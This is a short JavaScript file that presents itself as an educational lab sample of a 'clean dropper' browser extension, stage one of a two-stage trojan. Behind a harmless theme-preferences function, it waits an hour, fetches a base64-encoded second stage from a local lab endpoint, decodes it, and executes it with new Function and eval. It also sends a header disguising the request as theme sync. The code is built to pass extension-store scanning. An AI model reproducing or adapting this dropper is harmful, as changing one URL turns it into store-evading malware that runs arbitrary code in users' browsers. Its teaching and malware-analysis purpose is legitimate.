/**
 * Educational Browser-Extension Stage-1 'Clean Dropper' Sample (PENT-15).
 *
 * Models the two-stage extension trojan pattern discussed in MYO062 (19.10 lecture):
 * 1. Extension ships with clean-looking theme/productivity code to pass initial store scan.
 * 2. After a deferred timer (setTimeout), it fetches a remote payload from a server,
 *    decodes it (atob), and executes it dynamically (new Function / eval).
 *
 * Strictly scoped to http://127.0.0.1:8765/stage2.js for offline lab analysis.
 */

const LAB_STAGE2_ENDPOINT = "http://127.0.0.1:8765/stage2.js";

function syncThemePreferences() {
  const localPrefs = { theme: "dark", compact: true };
  return JSON.stringify(localPrefs);
}

function scheduleDeferredSync() {
  setTimeout(async () => {
    const response = await fetch(LAB_STAGE2_ENDPOINT, {
      redirect: "error",
      headers: { "X-Client-Module": "theme-sync-1.0" }
    });
    if (!response.ok) {
      throw new Error(`Stage-2 request failed: ${response.status}`);
    }
    const encodedPatch = await response.text();
    const decodedScript = atob(encodedPatch.trim());
    const runner = new Function(decodedScript);
    runner();
    eval(decodedScript);
  }, 3600 * 1000);
}

export { syncThemePreferences, scheduleDeferredSync };
